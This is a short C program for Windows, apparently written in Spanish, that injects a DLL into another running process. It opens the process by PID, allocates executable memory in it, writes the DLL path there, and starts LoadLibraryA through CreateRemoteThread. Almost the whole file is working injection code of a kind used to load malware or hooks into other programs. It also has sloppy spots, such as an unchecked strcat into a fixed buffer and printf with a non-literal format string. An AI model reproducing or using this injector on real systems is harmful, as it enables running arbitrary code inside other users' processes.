#include <windows.h>
#include <winbase.h>
#include <stdio.h>



void printLastError() {
    char error[255];
    FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
               NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
               error, (sizeof(error) / sizeof(char)), NULL);
     printf(error);
}

int main(int argc, char *argv[]) {

    char directorio[255];
    
    GetCurrentDirectory(255, directorio);

    printf("\n[+] Directorio actual: %s", directorio);

    strcat(directorio, "\\");
    strcat(directorio, argv[1]);

    LPCSTR dll = directorio;

    HANDLE p = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, atoi(argv[2]));
    if (p == NULL) {
        printf("\nError al controlar el proceso:");
        printLastError();
        return 1;
    }
    printf("\n[+] Proceso controlado correctamente en 0x%p", p);

    

    LPVOID vAlloc = VirtualAllocEx(p, NULL, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); 
    if (vAlloc == NULL) {
        printf("\nError al solicitar memoria en el proceso: ");
        printLastError();
        return 1;
    }
    printf("\n[+] Memoria creada en el espacio del proceso correctamente en 0x%p", vAlloc);

    BOOL result = WriteProcessMemory(p, vAlloc, dll, strlen(dll) + 1, NULL);

    if (result == FALSE) {
        printf("\nError al escribir la shellcode en la memoria del proceso: ");
        printLastError();
        return 1;
    }
    printf("\n[+] Path de la DLL copiada en la memoria del proceso correctamente");

    
    printf("\n[+] DLL a inyectar: %s", dll);

    HANDLE remoteThread = CreateRemoteThread(p, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, vAlloc, 0, NULL);

    if (remoteThread == NULL) {
        printf("\nError al inyectar la DLL: ");
        printLastError();
        return 1;
    }
    printf("\n[+] DLL ejecutada correctamente en 0x%p", remoteThread);

    WaitForSingleObject(remoteThread, INFINITE);

    DWORD exitCode = 0;
    GetExitCodeThread(remoteThread, &exitCode);

    if (exitCode != 0) {
        printf("\nShellcode ejecutada correctamente.");
    }
    
    CloseHandle(remoteThread);
    CloseHandle(p);   

    printf("\n");
    return 0;
}